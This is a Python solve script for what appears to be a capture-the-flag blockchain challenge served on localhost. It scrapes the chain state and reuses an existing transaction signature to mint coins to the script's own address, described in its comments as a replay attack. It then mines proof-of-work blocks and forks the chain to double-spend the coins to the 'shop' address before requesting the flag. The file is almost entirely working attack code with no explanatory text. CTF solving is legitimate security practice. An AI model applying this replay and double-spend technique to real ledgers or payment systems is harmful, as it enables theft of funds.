import random
from functools import reduce

import json
import os
import pickle
import time

import requests, re
import rsa,uuid,hashlib
from requests import session
IP = "localhost"
PORT = 5000
PREFIX = "b9af31f66147e"
BASE = f"http://{IP}:{PORT}/{PREFIX}"
s = requests.Session()
def reset():
    #reset bloakchain
    response = s.get(f"{BASE}/reset")
    return response.text
print(reset())
def hash_utxo(utxo):
    return hash_reducer(hash_reducer(utxo['id'], utxo['addr']), str(utxo['amount']))
def hash(x):
    if isinstance(x, str):
        x = x.encode()
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
def hash_reducer(x, y):
    return hash(hash(x) + hash(y))
def has_attrs(d, attrs):
    if type(d) != type({}): raise Exception("Input should be a dict/JSON")
    for attr in attrs:
        if attr not in d:
            raise Exception("{} should be presented in the input".format(attr))
EMPTY_HASH = '0' * 64
def addr_to_pubkey(address):
    return rsa.PublicKey(int(address, 16), 65537)
def pubkey_to_address(pubkey):
    assert pubkey.e == 65537
    hexed = hex(pubkey.n)
    if hexed.endswith('L'): hexed = hexed[:-1]
    if hexed.startswith('0x'): hexed = hexed[2:]
    return hexed
def gen_addr_key_pair():
    pubkey, privkey = rsa.newkeys(384)
    return pubkey_to_address(pubkey), privkey
def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo
def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])
def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'],
                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])
def init_session():
    r = s.get(BASE + "/")
    r.raise_for_status()
    txt = r.text
    return txt

def get_utxo():
    print("get content")
    home = init_session()
    m3 = re.search(r'Blockchain Explorer:\s*(\{.*\})', home)
    utxos_json = m3.group(1)
    utxos = json.loads(utxos_json)
    genesis_match = re.search(r'hash of genesis block: ([a-f0-9]+)', home)
    genesis_hash = genesis_match.group(1) if genesis_match else None
    addresses = {}
    addr_matches = re.findall(r"the (\w+)'s addr:\s*([a-f0-9]+)", home)
    for name, addr in addr_matches:
        addresses[name] = addr
    return utxos,genesis_hash,addresses

#set address and get information
my_address, my_privkey = gen_addr_key_pair()
utxos,genesis_hash,addresses=get_utxo()
address_attacker=addresses['hacker']
address_shop=addresses['shop']
def submit_block(block):

    response = s.post(
        f"{BASE}/create_transaction",
        data=json.dumps(block),
        headers={'Content-Type': 'application/json'}
    )
    return response.text
def get_flag():
    #get flag
    response =s.get(f"{BASE}/flag")
    return response.text
def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block

treasure_utxo_input=None
treasure_utxo_signature = None
#get input with signature
for utxo_id, utxo in utxos.items():
    print(utxo)
    if utxo['height'] == 1:
        treasure_utxo_signature = utxo['transactions'][0]['signature'][0]
        treasure_utxo_input = utxo['transactions'][0]['input'][0]
        break
if not treasure_utxo_signature:
    print("未找到宝藏UTXO")
print(treasure_utxo_signature)

#create fake transaction to replay attack
fake_tran_input=treasure_utxo_input
fake_tx = {
    'input': [fake_tran_input],
    'signature': [treasure_utxo_signature],
    'output': [create_output_utxo(my_address,1000000)]
}
fake_tx['hash'] = hash_tx(fake_tx)

DIFFICULTY = int('00000' + 'f' * 59, 16)
def create_block_with_PoW(pre_hash,tx):
    block=None
    while True:
        #use random string to match the Difficulty
        nonce_str = str(random.getrandbits(64))
        block = create_block(pre_hash, nonce_str, tx)
        block_hash = int(block['hash'], 16)
        if block_hash <= DIFFICULTY:
            return block

def gen_block(pre_hash,tx):
    print(pre_hash)
    #find the proper nounce
    block =create_block_with_PoW(pre_hash, tx)
    print(submit_block(block))
    return hash_block(block)
def show_block():
    global utxos
    home = init_session()
    m3 = re.search(r'Blockchain Explorer:\s*(\{.*\})', home)
    if not m3:
        print("[-] 无法解析 UTXOs，页面内容可能不同。显示页面片段：\n", home[:1500])
        exit(1)
    utxos_json = m3.group(1)
    utxos = json.loads(utxos_json)
    print(utxos)

#replay attack
pre_hash=gen_block(genesis_hash,[fake_tx])
time.sleep(5)

pre_hash1=gen_block(pre_hash,[])
time.sleep(5)
pre_hash2=gen_block(pre_hash1,[])
time.sleep(5)

#get the output of replay as the input
utxos,genesis_hash,addresses=get_utxo()
for utxo_id, utxo in utxos.items():
    print(utxo)
    if utxo_id == pre_hash:
        treasure_utxo_signature = utxo['transactions'][0]['signature'][0]
        treasure_utxo_input = utxo['transactions'][0]['output'][0]['id']
        break
if not treasure_utxo_signature:
    print("未找到宝藏UTXO")
print(treasure_utxo_signature)

fake_tran_input=treasure_utxo_input
fake_tx = {
    'input': [fake_tran_input],
    'signature': [rsa.sign(fake_tran_input.encode(), my_privkey, 'SHA-1').hex()],
    'output': [create_output_utxo(address_shop,1000000)]
}
fake_tx['hash'] = hash_tx(fake_tx)
pre_hash3=gen_block(pre_hash2,[fake_tx])

pre_hash4_fork=gen_block(pre_hash2,[fake_tx])
pre_hash5=gen_block(pre_hash4_fork,[])
pre_hash6=gen_block(pre_hash5,[])
time.sleep(5)
show_block()
print(get_flag())
